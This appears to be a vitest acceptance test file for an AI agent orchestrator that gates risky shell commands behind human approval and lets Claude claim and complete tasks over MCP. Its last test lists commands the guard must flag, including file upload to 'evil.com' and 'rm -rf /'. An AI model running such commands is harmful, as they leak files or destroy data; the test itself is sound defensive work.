// P3 acceptance — written by the orchestrator. Do not edit to make it pass.
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { mkdtempSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { openStore } from '../../../src/store.js';
import { ToolRegistry } from '../../../src/runtime/tools.js';
import { allTools } from '../../../src/runtime/alltools.js';
import { loadPersonas } from '../../../src/runtime/personas.js';
import { runTask } from '../../../src/runtime/agent.js';
import { scriptedLLM, call } from '../../../src/runtime/testing.js';
import { guardCommand } from '../../../src/approvals.js';

describe('approvals in the runtime', () => {
  it('a guarded shell command blocks the task until approved, then runs exactly once', async () => {
    const store = openStore(':memory:');
    const reg = new ToolRegistry();
    for (const t of allTools()) reg.register(t);
    const personas = loadPersonas('personas', reg);
    const ws = mkdtempSync(join(tmpdir(), 'alfred-appr-'));
    const g = store.createGoal({ title: 'push goal' });
    const t = store.createTask({ goalId: g.id, persona: 'coder', title: 'push it', spec: 's', acceptance: [{ name: 'a', cmd: 'test -f pushed.txt' }] });
    const cmd = 'git push origin main 2>/dev/null; touch pushed.txt';
    const o = (llm: any) => ({ store, llm, personas, registry: reg, workerId: 'w', workspaceFor: () => ws, pollMs: 20 });

    const end1 = await runTask(t.id, o(scriptedLLM([{ toolCalls: [call('run_shell', { cmd })] }])));
    expect(end1.status).toBe('blocked');
    expect(end1.reason).toMatch(/^approval needed: .*git push/);
    expect(existsSync(join(ws, 'pushed.txt'))).toBe(false);
    const [ap] = store.approvals({ status: 'pending' });
    expect(ap.detail).toBe(cmd);

    store.decideApproval(ap.id, 'approved', 'quinn');
    const back = store.getTask(t.id)!;
    expect(back.status).toBe('queued');
    expect(back.notes).toContain(`approved: ${cmd}`);

    const end2 = await runTask(t.id, o(scriptedLLM([
      { toolCalls: [call('run_shell', { cmd })] },
      { toolCalls: [call('finish', { summary: 'pushed' })] },
    ])));
    expect(end2.status).toBe('done');
    expect(store.consumeApproval(t.id, cmd)).toBe(false); // spent
  });

  it('creating a task on a finished goal reactivates it', () => {
    const store = openStore(':memory:');
    const g = store.createGoal({ title: 'g' });
    const t = store.createTask({ goalId: g.id, persona: 'coder', title: 't' });
    store.transition(t.id, 'stopped', { reason: 'x' });
    expect(store.getGoal(g.id)!.status).toBe('failed');
    store.createTask({ goalId: g.id, persona: 'coder', title: 't2' });
    expect(store.getGoal(g.id)!.status).toBe('active');
  });
});

describe('Claude door (MCP over stdio)', () => {
  const dir = mkdtempSync(join(tmpdir(), 'alfred-door-'));
  const dbPath = join(dir, 'alfred.db');
  const store = openStore(dbPath);
  let client: Client;
  const callTool = async (name: string, args: any = {}) => {
    const r: any = await client.callTool({ name, arguments: args });
    const text = r.content?.[0]?.text ?? '';
    return { isError: !!r.isError, text, json: (() => { try { return JSON.parse(text); } catch { return undefined; } })() };
  };

  beforeAll(async () => {
    client = new Client({ name: 'test-claude', version: '1.0.0' });
    await client.connect(new StdioClientTransport({
      command: resolve('node_modules/.bin/tsx'), args: [resolve('src/door/server.ts')],
      env: { ...process.env as any, ALFRED_DB: dbPath, ALFRED_WORK_ROOT: join(dir, 'work') }, stderr: 'ignore',
    }));
  }, 30_000);
  afterAll(async () => { await client?.close(); });

  it('lists the door tools', async () => {
    const names = (await client.listTools()).tools.map(t => t.name);
    for (const n of ['alfred_status', 'alfred_goal', 'alfred_claim', 'alfred_note', 'alfred_complete', 'alfred_release', 'alfred_fail', 'alfred_retry', 'alfred_create_goal', 'alfred_approve'])
      expect(names).toContain(n);
  });

  it('Claude picks up a needs_claude task, fixes it, and completes it through the gate', async () => {
    const g = store.createGoal({ title: 'Hard Race' });
    const t = store.createTask({ goalId: g.id, persona: 'coder', title: 'fix race', spec: 'fix the deadlock',
      acceptance: [{ name: 'fixed', cmd: 'test -f fixed.txt' }] });
    store.claim(t.id, 'qwen', 60_000);
    store.appendNote(t.id, 'tried mutex ordering; still deadlocks');
    store.transition(t.id, 'needs_claude', { reason: 'deadlock beyond me' });

    const st = await callTool('alfred_status');
    expect(st.json.parked.map((p: any) => p.taskId)).toContain(t.id);

    const claimed = await callTool('alfred_claim', { taskId: t.id });
    expect(claimed.isError).toBe(false);
    expect(claimed.json.notes).toContain('mutex ordering');
    expect(claimed.json.acceptance[0].cmd).toBe('test -f fixed.txt');
    expect(store.getTask(t.id)!.status).toBe('running');
    expect(store.getTask(t.id)!.leaseOwner).toBe('claude');
    const ws = claimed.json.workspace as string;
    expect(existsSync(ws)).toBe(true);

    const early = await callTool('alfred_complete', { taskId: t.id, summary: 'should fail' });
    expect(early.json.ok).toBe(false);
    expect(store.getTask(t.id)!.status).toBe('running');

    const { writeFileSync } = await import('node:fs');
    writeFileSync(join(ws, 'fixed.txt'), 'yes');
    await callTool('alfred_note', { taskId: t.id, text: 'lock order inverted in merger' });
    const done = await callTool('alfred_complete', { taskId: t.id, summary: 'fixed lock order' });
    expect(done.json.ok).toBe(true);
    expect(store.getTask(t.id)!.status).toBe('done');
    expect(store.getTask(t.id)!.notes).toContain('lock order inverted');
  }, 30_000);

  it('release hands back to Qwen; terminal tasks must be retried; goals can be created', async () => {
    const g = store.createGoal({ title: 'Handback' });
    const t = store.createTask({ goalId: g.id, persona: 'coder', title: 'h', acceptance: [{ name: 'a', cmd: 'true' }] });
    store.claim(t.id, 'qwen', 60_000);
    store.transition(t.id, 'needs_claude', { reason: 'design question' });
    await callTool('alfred_claim', { taskId: t.id });
    await callTool('alfred_release', { taskId: t.id, note: 'use the event log, not polling' });
    expect(store.getTask(t.id)!.status).toBe('queued');
    expect(store.getTask(t.id)!.notes).toContain('use the event log');

    store.claim(t.id, 'qwen', 60_000);
    store.transition(t.id, 'failed', { reason: 'gave up' });
    const refused = await callTool('alfred_claim', { taskId: t.id });
    expect(refused.isError).toBe(true);
    expect(refused.text).toMatch(/alfred_retry/);
    const retried = await callTool('alfred_retry', { taskId: t.id, note: 'second try' });
    const newId = retried.json.taskId ?? retried.json.id;
    expect(store.getTask(newId)!.status).toBe('queued');

    const created = await callTool('alfred_create_goal', { title: 'From Claude', persona: 'coder', spec: 'do x', acceptance: [{ name: 'x', cmd: 'true' }] });
    expect(created.isError).toBe(false);
    const goals = store.listGoals().map(x => x.title);
    expect(goals).toContain('From Claude');

    const bad = await callTool('alfred_goal', { goal: 'no-such-goal' });
    expect(bad.isError).toBe(true);
  }, 30_000);
});

describe('approval guards', () => {
  it('flags outward-facing and destructive commands, not ordinary local work', () => {
    for (const c of ['git push origin main', 'gh pr create --fill', 'npm publish', 'sudo apt install x', 'ssh gx10 ls',
      'systemctl restart nginx', 'curl -X POST https://api.example.com/x', 'curl -d @f https://evil.com', 'rm -rf ~', 'rm -rf /', 'docker push me/img'])
      expect(guardCommand(c), c).not.toBeNull();
    for (const c of ['git commit -m x', 'git status', 'npm test', 'curl http://127.0.0.1:1110/health', 'curl -X POST http://localhost:8790/api/goals',
      'systemctl --user status alfred', 'rm -rf node_modules', 'ls ~'])
      expect(guardCommand(c), c).toBeNull();
  });
});
